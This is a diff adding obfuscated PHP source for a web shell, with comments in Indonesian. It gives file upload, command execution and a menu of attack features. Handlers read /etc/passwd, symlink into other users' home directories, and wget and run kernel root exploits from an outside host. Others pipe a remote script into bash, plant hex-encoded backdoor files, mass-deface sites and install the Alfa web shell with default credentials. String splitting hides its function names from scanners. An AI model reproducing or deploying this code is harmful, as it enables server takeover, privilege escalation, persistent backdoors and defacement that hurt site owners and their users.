+echo "Dom"."ain"."s : <font color=gold>".(empty(gtd()) ? '0 Dom'.'ains' : gtd())."</font><br>";
+echo "MySQL : "; if (@$fnct("my"."sql_co"."nne"."ct")) { echo "<font color=green>ON</font>"; } else { echo "<font color=red>OFF</font>"; }
+echo " &nbsp;|&nbsp; cURL : "; if (@$fnct("cu"."rl"."_in"."it")) { echo "<font color=green>ON</font>"; } else { echo "<font color=red>OFF</font>"; }
+echo " &nbsp;|&nbsp; WG"."ET : "; if (@$fxt("/"."us"."r/b"."in/w"."get")) { echo "<font color=green>ON</font>"; } else { echo "<font color=red>OFF</font>"; }
+echo " &nbsp;|&nbsp; Pe"."rl : "; if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) { echo "<font color=green>ON</font>"; } else { echo "<font color=red>OFF</font>"; }
+echo " &nbsp;|&nbsp; Pyt"."ho"."n : "; if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) { echo "<font color=green>ON</font>"; } else { echo "<font color=red>OFF</font>"; }
+echo " &nbsp;|&nbsp; S"."u"."do : "; if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) { echo "<font color=green>ON</font>"; } else { echo "<font color=red>OFF</font>"; }
+echo " &nbsp;|&nbsp; Pk"."e"."x"."e"."c : "; if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) { echo "<font color=green>ON</font>"; } else { echo "<font color=red>OFF</font>"; }
+echo "<br>Di"."rect"."ory : &nbsp;";
+
+foreach($_POST as $key => $value){ $_POST[$key] = $sts($value); }
+
+if(isset($_GET['loknya'])){ $lokasi = $_GET['loknya']; $lokdua = $_GET['loknya']; } else { $lokasi = $gcw(); $lokdua = $gcw(); }
+
+$lokasi = $srl('\\','/',$lokasi); $lokasis = $exp('/',$lokasi); $lokasinya = @$scd($lokasi);
+
+foreach($lokasis as $id => $lok){
+	if($lok == '' && $id == 0){ $a = true; echo '<a href="?loknya=/">/</a>'; continue; }
+	if($lok == '') continue;
+	echo '<a href="?loknya=';
+	for($i=0;$i<=$id;$i++){ echo "$lokasis[$i]"; if($i != $id) echo "/"; } 
+	echo '">'.$lok.'</a>/';
+}
+
+echo '</td></tr><tr><td><br>';
+
+// ============================================================
+// UPLOAD & COMMAND
+// ============================================================
+if (isset($_POST['upwkwk'])) {
+	if (isset($_POST['berkasnya'])) {
+		if ($_POST['di'.'rnya'] == "2") { $lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT']; }
+		if (empty($_FILES['ber'.'kas']['name'])) { echo "<font color=orange>Fi"."le not Se"."lected !</font><br><br>"; }
+		else {
+			if ($_FILES['ber'.'kas']['size'] == 0) { echo "<font color=red>Fi"."le 0KB — Bl"."ocked !</font><br><br>"; }
+			else {
+				$tgn = $ftm($lokasi);
+				$data = @$fpt($lokasi."/".$_FILES['ber'.'kas']['name'], @$fgt($_FILES['ber'.'kas']['tm'.'p_na'.'me']));
+				if ($fxt($lokasi."/".$_FILES['ber'.'kas']['name'])) {
+					$fl = $lokasi."/".$_FILES['ber'.'kas']['name'];
+					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
+					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
+						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
+					}
+					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_FILES['ber'.'kas']['name'], $tgn);
+					echo "<br>";
+				} else { echo "<font color='red'>Fa"."ile"."d to Up"."lo"."ad !</font><br><br>"; }
+			}
+		}
+	} elseif (isset($_POST['linknya'])) {
+		if (empty($_POST['namalink'])) { echo "<font color=orange>Fi"."lename cannot be empty !</font><br><br>"; }
+		elseif (empty($_POST['darilink'])) { echo "<font color=orange>Li"."nk cannot be empty !</font><br><br>"; }
+		else {
+			if ($_POST['di'.'rnya'] == "2") { $lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT']; }
+			$tgn = $ftm($lokasi);
+			$content = @$fgt($_POST['darilink']);
+			if (strlen($content) == 0) { echo "<font color=red>Co"."nten"."t 0KB — Bl"."ocked !</font><br><br>"; }
+			else {
+				$data = @$fpt($lokasi."/".$_POST['namalink'], $content);
+				if ($fxt($lokasi."/".$_POST['namalink'])) {
+					$fl = $lokasi."/".$_POST['namalink'];
+					echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
+					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
+						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
+					}
+					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_POST['namalink'], $tgn);
+					echo "<br>";
+				} else { echo "<font color='red'>Fa"."iled to Up"."lo"."ad !</font><br><br>"; }
+			}
+		}
+	}
+}
+
+echo "Uplo"."ad Fi"."le : ";
+echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
+<input type="radio" value="1" name="di'.'rnya" checked>cur'.'ren'.'t_di'.'r [ '.cdrd().' ]
+<input type="radio" value="2" name="di'.'rnya" >docu'.'men'.'t_ro'.'ot [ '.crt().' ]
+<br>
+<input type="hidden" name="upwkwk" value="aplod">
+<input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="Up'.'load" class="up" style="cursor: pointer; border-color: #fff"><br>
+<input type="text" name="darilink" class="up" placeholder="https://an'.'on7.xyz/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+</form>';
+echo '<br><form method="post" enctype="appl'.'ication/x-ww'.'w-form-u'.'rlencoded">
+Co'.'mm'.'an'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="';
+if (isset($_POST['komend'])) { echo $hsc($_POST['komend']); } else { echo "un"."am"."e -"."a"; }
+echo '">
+<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
+</form>';
+echo "</table><br>";
+
+// ============================================================
+// NAVIGASI MENU (LENGKAP)
+// ============================================================
+
+echo '<hr><center style="font-family: Russo One;flex-wrap:wrap;display:flex;justify-content:center;gap:4px;">';
+echo tuls("GRAB", $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi."&opsi=grab");
+echo tuls("CONFIG", $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi."&opsi=config");
+echo tuls("FIND PASS", $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi."&opsi=findpass");
+
+echo tuls("TEBAR", $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi."&opsi=spread");
+
+$menus = [
+    "HOME" => "",
+    "BACKUP" => "&opsi=bekup",
+    "JUMP" => "&opsi=lompat",
+    "DEFACE" => "&opsi=mdf",
+    "SCAN ROOT" => "&opsi=scanr",
+    "SYMLINK" => "&opsi=esyeem",
+    "ALFA" => "&opsi=alfa",
+    "ROOT ME" => "&opsi=rootme",
+    "GS-SOCKET" => "&opsi=gssocket",
+    "CRACK" => "&opsi=crack",
+    "WP ADD" => "&opsi=wpadd",
+    "JML ADD" => "&opsi=jmladd",
+    "HTACCESS" => "&opsi=htaccess",
+    "PHP EXP" => "&opsi=phpexp",
+    "FILE SCAN" => "&opsi=filescan",
+    "KILLER" => "&opsi=killer",
+    "GS-UNINSTALL" => "&opsi=gsuninstall",
+    "PANEL" => "&opsi=panel",
+    "PLUGINS" => "&opsi=plugins",
+    "KERNEL" => "&opsi=kernel",
+    "LSCAN" => "&opsi=lscan",
+    "SSHSCAN" => "&opsi=sshscan",
+    "WINSCAN" => "&opsi=winscan",
+    "DOMAIN" => "&opsi=domain",
+    "LINPEAS" => "&opsi=linpeas",
+    "WP" => "&opsi=wp",
+];
+
+foreach($menus as $label=>$param){
+    $link = $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi.$param;
+    echo "[ <a href='".$link."' style='font-size:11px;'>".$label."</a> ] ";
+}
+echo "<hr></center><br>";
+
+// ============================================================
+// HANDLER FITUR LENGKAP
+// ============================================================
+
+// ============================================================
+// 1. LOMPAT (JUMPING)
+// ============================================================
+if (isset($_GET['loknya']) && $_GET['opsi'] == "lompat") {
+	if ($ird("/e"."tc"."/p"."as"."sw"."d")) { $fjp = $fgt("/e"."tc"."/p"."as"."sw"."d"); } elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) { $fjp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi); } else { die(red("[!] Gagal Mengambil Di"."rect"."ory !")); }
+	$pma("/\/ho"."me\/(.*?):/i", $fjp, $fjpr); $fjpr = $fjpr[1]; if (empty($fjpr)) { die(red("[!] Tidak Ada Us"."er di Temukan !")); }
+	echo "Total Ada ".$ctn($aru($fjpr))." di"."rec"."to"."ry di Ser"."ver <font color=gold>".$_SERVER[$rad]."</font><br><br>";
+	foreach ($aru($fjpr) as $fj) {
+		$fjh = "/h"."om"."e/".$fj."/pu"."bl"."ic_h"."tml";
+		if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
+			$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
+			$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en); $en = $en[1];
+			if ($ird($fjh)) { echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$fjh."'>".$fjh."</a> => "; } else { echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a> => "; }
+			foreach ($aru($en) as $enw) { $asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw)); $asd = $asd['name']; if ($asd == $fj) { echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, "; } }
+			echo "<br>";
+		} else {
+			if ($ird($fjh)) { echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$fjh."'>".$fjh."</a><br>"; } else { echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a><br>"; }
+		}
+	}
+	echo "<hr>"; die(author());
+}
+
+// ============================================================
+// 2. SYMLINK
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "esyeem") {
+	if ($ird("/e"."tc"."/p"."as"."sw"."d")) { $syp = $fgt("/e"."tc"."/p"."as"."sw"."d"); } elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) { $syp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi); } else { die(red("[!] Gagal Mengambil Di"."rec"."to"."ry !")); }
+	if (!$fnct("sy"."mli"."nk")) { if (!$fnct("pr"."oc_"."op"."en")) { die(red("[!] Sy"."mli"."nk Fu"."nct"."ion is Di"."sabl"."ed !")); } }
+	echo "<center>[ <gold>GR"."AB CO"."NFIG</gold> ] - [ <a href=".$_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I']."&opsidua=s"."yfile><gold>SY"."MLI"."NK FI"."LE</gold></a> ] - [ <gold>SY"."MLI"."NK VH"."OST</gold> ]</center>";
+	if (isset($_GET['opsidua'])) {
+		if ($_GET['opsidua'] == "s"."yfile") {
+			echo "<br><br><center>Opsi : <gold>Sy"."mli"."nk Fi"."le</gold>";
+			echo '<form method="post">File : <input type="text" name="domena" style="cursor: pointer; border-color: #000" class="up" placeholder="/ho'.'me/'.'use'.'r/p'.'ubli'.'c_ht'.'ml/da'.'tab'.'ase.'.'php"><input type="submit" name="gaskeun" value="Gaskeun" class="up" style="cursor: pointer"></form></center>';
+			if (isset($_POST['gaskeun'])) { $rend = rand().".txt"; $lokdi = $_POST['domena']; esyeem($lokdi, "an"."on_s"."ym/".$rend); echo '<br><center>Cek : <a href="an'.'on_'.'sy'.'m/'.$rend.'"><gold>'.$rend."</gold></a></center><br>"; }
+		}
+		echo "<hr>"; die(author());
+	}
+	$pma("/\/ho"."me\/(.*?):/i", $syp, $sypr); $sypr = $sypr[1]; if (empty($sypr)) { die(red("[!] Tidak Ada Us"."er di Temukan !")); }
+	echo "Total Ada ".$ctn($aru($sypr))." Us"."er di Ser"."ver <font color=gold>".$_SERVER[$rad]."</font><br><br>";
+	if (!$isw(getcwd())) { die(red("[!] Gagal Sy"."mli"."nk - Red D"."ir !")); }
+	if (!$fxt("an"."on_"."sy"."m")) { $mdr("an"."on_"."sy"."m"); }
+	if (!$fxt("an"."on_"."sy"."m/.ht"."acc"."ess")) { $fpt("an"."on_"."sy"."m/."."h"."ta"."cce"."ss", $urd("Opt"."ions%20In"."dexe"."s%20Fol"."lowSy"."mLi"."nks%0D%0ADi"."rect"."oryIn"."dex%20sss"."sss.htm%0D%0AAdd"."Type%20txt%20.ph"."p%0D%0AAd"."dHand"."ler%20txt%20.p"."hp")); }
+	$ckn = esyeem("/", "an"."on_"."sy"."m/anon");
+	foreach ($aru($sypr) as $sj) {
+		$sjh = "/h"."om"."e/".$sj."/pu"."bl"."ic_h"."tml";
+		$ygy = $srl($bsn($_SERVER['SC'.'RI'.'PT_NA'.'ME']), "an"."on_"."sy"."m/anon".$sjh, $_SERVER['SC'.'RI'.'PT_NA'.'ME']);
+		if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
+			$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
+			$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en); $en = $en[1];
+			echo "[<font color=gold>Sy"."mli"."nk</font>] <a href='".$ygy."' target=_blank>".$sjh."</a> => ";
+			foreach ($aru($en) as $enw) { $asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw)); $asd = $asd['name']; if ($asd == $sj) { echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, "; } }
+			echo "<br>";
+		} else {
+			echo "[<font color=gold>Sy"."mli"."nk</font>] <a href='".$ygy."' target=_blank>".$sjh."</a><br>";
+		}
+	}
+	echo "<hr>"; die(author());
+}
+
+// ============================================================
+// 3. SCAN ROOT
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "scanr") {
+	ob_implicit_flush();ob_end_flush();
+	echo '<center>[ <a href="'.$_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'].'&opsidua=au'.'tos'.'can"><gold>Au'.'to Sc'.'an</gold></a> ] | [ <a href="'.$_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'].'&opsidua=sc'.'ansd"><gold>Sc'.'an S'.'U'.'I'.'D</gold></a> ] | [ <a href="'.$_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'].'&opsidua=esg"><gold>Ex'.'plo'.'it Su'.'gges'.'ter</gold></a> ]</center>';
+	if (!$fnct("pr"."oc_"."op"."en")) { die(red("[!] Co"."mman"."d is D"."isab"."led !")); }
+	if (!$isw($lokasi)) { die(red("[!] Cur"."rent D"."ir"."ect"."ory is Un"."wri"."tea"."ble !")); }
+	if (isset($_GET['opsidua']) && $_GET['opsidua'] == "au"."tosc"."an") {
+		if (!$fxt($lokasi."/an"."on_"."ro"."ot/")) {
+			$mdr($lokasi."/an"."on_"."ro"."ot");
+			komenb("wg"."et h"."ttp://f.pp"."k.pw/aut"."o.ta"."r"."-06-27-"."22.gz", $lokasi."/an"."on_"."ro"."ot");
+			komenb("t"."ar -x"."f au"."to.ta"."r-06-2"."7-22."."gz", $lokasi."/an"."on_"."ro"."ot");
+			if (!$fxt($lokasi."/an"."on_"."ro"."ot/netf"."ilter")) { die(red("[!] Ga"."gal Do"."wnloa"."d Bahan")); }
+		}
+		echo "<br>Ke"."rne"."l : <gold>".komenb("un"."am"."e -a", $lokasi)."</gold><br>";
+		echo "Us"."er : <gold>".komenb("i"."d", $lokasi)."</gold><br>";
+		echo "<br>[+] Trying All Ex"."plo"."its ...<br>";
+		echo "Ne"."tfil"."ter : ".komend("ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/netf"."ilter", $lokasi)."<br>";
+		echo "Ptr"."ace : ".komend("ec"."ho id | ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/ptr"."ace", $lokasi)."<br>";
+		echo "Seq"."uoia : ".komend("ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/seq"."uoia", $lokasi)."<br>";
+		echo "Over"."layF"."S : ".komend("ec"."ho id | ./overl"."ayfs", $lokasi."/an"."on_"."ro"."ot")."<br>";
+		echo "Di"."rtyp"."ipe : ".komend("echo i"."d | ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/di"."rtyp"."ipe /u"."sr/"."bi"."n/"."su", $lokasi)."<br>";
+		echo "Su"."do : ".komend("ec"."ho 12345 | ti"."meo"."ut 1"."0 sud"."oed"."it -s Y", $lokasi)."<br>";
+		echo "Pw"."nki"."t : ".komend("ec"."ho id | ti"."meo"."ut 1"."0 ./p"."wnk"."it", $lokasi."/an"."on_"."ro"."ot")."<br>";
+		echo "Capsys : ".komend("echo id | timeout 10 ./cap"."sy"."s", $lokasi."/an"."on_ro"."ot")."<br>";
+		echo "Ne"."tfil"."ter 2 : ".komend("echo id | tim"."eout 10 ./ne"."tfilt"."er2", $lokasi."/an"."on_ro"."ot")."<br>";
+		echo "Ne"."tfil"."ter 3 : ".komend("echo id | time"."out 10 ./net"."fil"."ter3", $lokasi."/an"."on_ro"."ot")."<br>";
+		komenb("r"."m -r"."f an"."on_ro"."ot", $lokasi);
+	} elseif (isset($_GET['opsidua']) && $_GET['opsidua'] == "scansd") {
+		echo "<br>[+] Sc"."ann"."ing ...<br>";
+		echo komend("fi"."nd / -pe"."r"."m -u"."=s -t"."ype f"." 2".">/"."de"."v/nu"."ll", $lokasi);
+	} elseif (isset($_GET['opsidua']) && $_GET['opsidua'] == "esg") {
+		echo "<br>[+] Loading ...<br>";
+		echo komend("cu"."rl -"."Ls"."k ht"."tp://ra"."w.gith"."ubuse"."rconte"."nt.com/m"."zet"."-/lin"."ux-exp"."loit"."-sugge"."ster/m"."aste"."r/lin"."ux-ex"."ploi"."t-sugg"."ester."."sh | ba"."sh", $lokasi);
+	}
+	echo "<hr>"; die(author());
+}
+
+// ============================================================
+// 4. BACKUP SHELL
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "bekup") {
+	if (isset($_POST['lo'.'kr'.'una'])) {
+		echo "<center>"; echo "Path : <gold>".$hsc($_POST['lo'.'kr'.'una'])."</gold><br>";
+		if (!$isr($_POST['lo'.'kr'.'una'])) { die(red("[+] Cur"."rent Pa"."th is Unre"."adable !")); } elseif (!$isw($_POST['lo'.'kr'.'una'])) { die(red("[+] Cur"."rent Pa"."th is Un"."wri"."tea"."ble !")); }
+		$loks = sds($_POST['lo'.'kr'.'una']); $pisah = $ars($loks, -50); $los = $arr($pisah, 2); $satu = $loks[$los[0]]; $satut = $ftm($satu); $dua = $loks[$los[1]]; $duat = $ftm($dua);
+		if (empty($satu) && empty($dua)) { die(red("[+] Unknown Error !")); }
+		echo "<br>";
+		if (!$isw($satu)) { echo "[<merah>Fa"."il"."ed</merah>] ".$satu."<br>"; } else { $satus = $satu."/cont"."act.p"."hp"; $fpt($satus, $h2b("3c6d65746120636f6e74656e743d226e6f696e646578226e616d653d22726f626f7473223e436f6e74616374204d653c666f726d20656e63747970653d226d756c7469706172742f666f726d2d64617461226d6574686f643d22706f7374223e3c696e707574206e616d653d226274756c22747970653d2266696c65223e3c627574746f6e3e4761736b616e3c2f627574746f6e3e3c2f666f726d3e3c3f3d22223b24613d2766272e2769272e276c272e2765272e275f272e2770272e2775272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24623d2766272e2769272e276c272e2765272e275f272e2767272e2765272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24633d2774272e276d272e2770272e275f272e276e272e2761272e276d272e2765273b24643d2768272e276578272e273262272e27696e273b24663d2766272e27696c272e275f65272e277869272e277374272e2773273b696628697373657428245f46494c45535b276274756c275d29297b246128245f46494c45535b276274756c275d5b276e616d65275d2c246228245f46494c45535b276274756c275d5b24635d29293b696628246628272e2f272e245f46494c45535b276274756c275d5b276e616d65275d29297b6563686f20274f6b652021273b7d656c73657b6563686f20274661696c2021273b7d7d696628697373657428245f4745545b27667074275d29297b246128246428245f504f53545b2766275d292c246428245f504f53545b2764275d29293b696628246628246428245f504f53545b2766275d2929297b6563686f20224f6b652021223b7d656c73657b6563686f20224661696c2021223b7d7d3f3e")); $tch($satus, $satut); $tch($satu, $satut); echo "[<ijo>Su"."cc"."ess</ijo>] ".$satus."<br>"; if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) { $lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $satus); $satul = "<br><a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>"; } }
+		if (!$isw($dua)) { echo "[<merah>Fa"."il"."ed</merah>] ".$dua."<br>"; } else { $duas = $dua."/setti"."ng.p"."hp"; $fpt($duas, $h2b("3c6d657461206e616d653d22726f626f74732220636f6e74656e743d226e6f696e646578223e0d0a4d792053657474696e670d0a3c3f7068700d0a2461203d20226669222e226c655f70222e2275745f63222e226f6e74222e2265222e226e74222e2273223b0d0a2462203d202266222e22696c222e22655f6765222e2274222e225f636f222e226e74656e74222e2273223b0d0a2463203d20226669222e226c65222e225f6578222e226973222e227473223b0d0a2464203d202268222e226578222e223262222e22696e223b0d0a69662028697373657428245f504f53545b276b6f64275d2929207b0d0a09246128245f504f53545b276c6f6b275d2c20246428245f504f53545b276b6f64275d29293b0d0a0969662028246328245f504f53545b276c6f6b275d2929207b0d0a09096563686f20224f4b202120223b0d0a097d20656c7365207b0d0a09096563686f20224661696c6564202120223b0d0a097d0d0a7d0d0a69662028697373657428245f4745545b276963275d2929207b0d0a09696e636c75646520245f4745545b276963275d3b0d0a7d0d0a69662028697373657428245f4745545b276170275d2929207b0d0a0924612822776b776b2e706870222c20246428223363366436353734363132303665363136643635336432323732366636323666373437333232323036333666366537343635366537343364323236653666363936653634363537383232336534333666366537343631363337343230346436353363363636663732366432303664363537343638366636343364323237303666373337343232323036353665363337343739373036353364323236643735366337343639373036313732373432663666363637323664326436343631373436313232336533633639366537303735373432303734373937303635336432323636363936633635323232303665363136643635336432323632373437353663323233653363363237353734373436663665336534373631373336623631366533633266363237353734373436663665336533633266363636663732366433653061336333663730363837303061323436313230336432303232363632323265323236393232326532323663323232653232363532323265323235663232326532323730323232653232373532323265323237343232326532323566323232653232363332323265323236663232326532323665323232653232373432323265323236353232326532323665323232653232373432323265323237333232336230613234363232303364323032323636323232653232363932323265323236633232326532323635323232653232356632323265323236373232326532323635323232653232373432323265323235663232326532323633323232653232366632323265323236653232326532323734323232653232363532323265323236653232326532323734323232653232373332323362306132343633323033643230323237343232326532323664323232653232373032323265323235663232326532323665323232653232363132323265323236643232326532323635323233623061363936363230323836393637373336353734323832343566343634393463343535333562323736323734373536633237356432393239323037623234363132383234356634363439346334353533356232373632373437353663323735643562323736653631366436353237356432633230323436323238323435663436343934633435353335623237363237343735363332373564356232343633356432393239336236393636323032383636363936633635356636353738363937333734373332383232326532663232326532343566343634393463343535333562323736323734373536633237356435623237366536313664363532373564323932393230376236353633363836663230323234663662363532303231323233623764323036353663373336353230376236353633363836663230323234363631363936633230323132323362376437643061336633652229293b0d0a096966202824632822776b222e22776b2e222e227068222e2270222929207b0d0a09096563686f20224f4b2021223b0d0a097d0d0a7d0d0a3f3e")); $tch($duas, $duat); $tch($dua, $duat); echo "[<ijo>Su"."cc"."ess</ijo>] ".$duas."<br>"; if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) { $lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $duas); $dual = "<a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>"; } }
+		echo "<br>"; if (!empty($satul)) { echo $satul; } if (!empty($dual)) { echo $dual; } echo "</center>";
+	} else {
+		echo "<center>Masukkan Lokasi Docu"."ment Ro"."ot<br>";
+		echo '<form method="post"><input type="text" name="lokruna" value="'.$hsc($_GET['loknya']).'" style="cursor: pointer; border-color: #000" class="up"> ';
+		echo '<input type="submit" name="palepale" value="Gaskan" class="up" style="cursor: pointer"></form>';
+	}
+	die();
+}
+
+// ============================================================
+// 5. REVERSE IP
+// ============================================================
+elseif (isset($_GET['opsi']) && $_GET['opsi'] == "repip") {
+	echo "<center>"; echo "Re"."ver"."se I"."P : <gold>".$hsc($_SERVER['SE'.'RVE'.'R_NA'.'ME'])."</gold>"; echo "<pre>".$hsc(crul("http"."s://ap"."i.ha"."ck"."ertarg"."et.com/re"."verse"."ipl"."ookup/?q=".$_SERVER['SE'.'RVE'.'R_NA'.'ME']))."</pre>"; echo "</center>"; die();
+}
+
+// ============================================================
+// 6. MASS DEFACE
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "mdf") {
+	echo "<center>"; if (empty($_POST['palepale'])) {
+		echo '<form method="post">'; echo 'Di'.'r : <input type="text" name="lokena" class="up" style="cursor: pointer; border-color: #000" value="'.$hsc($_GET['loknya']).'"><br>'; echo 'Nama Fi'.'le : <input type="text" name="nfil" class="up" style="cursor: pointer; border-color: #000" value="ind'.'ex.p'.'hp"><br><br>'; echo 'Isi Fi'.'le : <br><textarea class="up" cols="80" rows="20" name="isikod"></textarea><br><br>'; echo '<select name="opsina"><option value="mdf">Ma'.'ss Def'.'ace</option><option value="mds">Ma'.'ss De'.'fa'.'ce 2</option></select><br><br>'; echo '<input type="submit" name="palepale" value="Gaskeun" class="up" style="cursor: pointer">'; echo '</form>';
+	} else {
+		$lokena = $_POST['lokena']; $nfil = $_POST['nfil']; $isif = $_POST['isikod']; echo "Di"."r : <gold>".$hsc($lokena)."</gold><br>";
+		if (!$fxt($lokena)) { die(red("[+] Di"."re"."cto"."ry Tidak di Temukan !")); }
+		$g = $scd($lokena);
+		if (isset($_POST['opsina']) && $_POST['opsina'] == "mds") {
+			foreach ($g as $gg) {
+				if (isset($gg) && $gg == "." || $gg == "..") { continue; } elseif (!$idr($gg)) { continue; }
+				if (!$isw($lokena."/".$gg)) { echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>"; continue; }
+				$loe = $lokena."/".$gg."/".$nfil; $cf = $fgr($gg);
+				if ($cf == "9"."9") { if ($fpt($loe, $isif) !== false) { if ($sps($gg, ".") !== false) { echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe." -> <a href='//".$gg."/".$nfil."'><gold>".$gg."/".$nfil."</gold></a><br>"; } else { echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>"; } } }
+			}
+			echo "<hr>"; die(author());
+		}
+		foreach ($g as $gg) {
+			if (isset($gg) && $gg == "." || $gg == "..") { continue; } elseif (!$idr($gg)) { continue; }
+			if (!$isw($lokena."/".$gg)) { echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>"; continue; }
+			$loe = $lokena."/".$gg."/".$nfil; if ($fpt($loe, $isif) !== false) { echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>"; } else { echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>"; }
+		}
+	}
+	echo "<hr>"; echo "</center>"; die(author());
+}
+
+// ============================================================
+// 7. ALFA WEBSHELL
+// ============================================================
+elseif (isset($_GET['loknya']) && $_GET['opsi'] == "alfa") {
+    echo "<center><h3>🔥 ALFA WEBSHELL INSTALLER</h3><hr>";
+    if (!$isw($lokasi)) { die(red("[!] Directory not writable!")); }
+    $phpv = phpversion(); $is_php8 = version_compare($phpv, '8.0', '>=');
+    if ($is_php8) { echo "<font color='orange'>⚠️ PHP $phpv — Alfa v1 may not work.</font><br>"; }
+    echo '<form method="post">Version: <select name="alfa_version" class="up"><option value="v4">Alfa V4 Tesla</option><option value="v7" selected>Alfa v2 (PHP 8)</option></select><br><br>Filename: <input type="text" name="alfa_name" value="alfa.php" class="up"><input type="submit" name="install_alfa" value="Install" class="up" style="cursor:pointer;"></form>';
+    if (isset($_POST['install_alfa'])) {
+        $version = $_POST['alfa_version']; $filename = $_POST['alfa_name']; $target = $lokasi . '/' . $filename;
+        $url = ($version == 'v4') ? "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/wpmotor.php" : "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/batosay.php";
+        echo "<br>[+] Downloading $version ...<br>"; $content = @file_get_contents($url);
+        if (strlen($content) > 1000) {
+            $content = str_replace('muhrazky@gmail.com', 'hackerman3177@gmail.com', $content);
+            file_put_contents($target, $content); chmod($target, 0644);
+            echo "✅ Alfa installed: <a href='$filename' target='_blank'>$filename</a><br>";
+            echo "📌 Full path: <a href='$filename' target='_blank'>" . $wb . "/" . basename($lokasi) . "/$filename</a><br>";
+            echo "🔑 Default: <b>admin</b> / <b>ehsan</b><br>";
+        } else { echo "❌ Failed to download. <a href='$url' target='_blank'>Download here</a>"; }
+    }
+    echo "<hr>"; die(author());
+}
+
+// ============================================================
